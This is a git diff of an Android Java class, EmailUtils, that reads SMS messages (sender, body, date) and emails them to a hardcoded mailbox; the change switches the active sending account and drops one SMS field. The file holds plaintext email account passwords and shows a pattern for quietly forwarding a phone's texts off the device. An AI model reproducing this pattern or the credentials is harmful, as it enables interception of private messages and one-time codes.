@@ -19,15 +19,15 @@ import java.util.Date;
  * Created by zhangfei on 15/9/20.
  */
 public class EmailUtils {
-    private static final String SENDER = "741152074@qq.com";
-    private static final String ACCOUNT = "741152074";
-    private static final String PASSWORD = "Chrome123";
-    private static final String SMTP_SERVER = "smtp.qq.com";
+//    private static final String SENDER = "741152074@qq.com";
+//    private static final String ACCOUNT = "741152074";
+//    private static final String PASSWORD = "Chrome123";
+//    private static final String SMTP_SERVER = "smtp.qq.com";
 
-//    private static final String SENDER = "a425537484@126.com";
-//    private static final String ACCOUNT = "a425537484";
-//    private static final String PASSWORD = "86431672";
-//    private static final String SMTP_SERVER = "smtp.126.com";
+    private static final String SENDER = "a425537484@126.com";
+    private static final String ACCOUNT = "a425537484";
+    private static final String PASSWORD = "86431672";
+    private static final String SMTP_SERVER = "smtp.126.com";
 
     private static final String RECEIVER = SENDER;
 
@@ -38,8 +38,7 @@ public class EmailUtils {
             Telephony.Sms._ID,
             Telephony.Sms.ADDRESS,
             Telephony.Sms.BODY,
-            Telephony.Sms.DATE,
-            Telephony.Sms.CREATOR
+            Telephony.Sms.DATE
     };
 
     public static boolean sendEmail(String subject, String message){
@@ -89,7 +88,6 @@ public class EmailUtils {
         }
 
         builder.append("内容：" + smsBody);
-
         boolean sent = sendEmail("检测到新短信", builder.toString());
         Log.d("sms", "sent?" + sent);
         Log.d("sms", "_id=" + id);
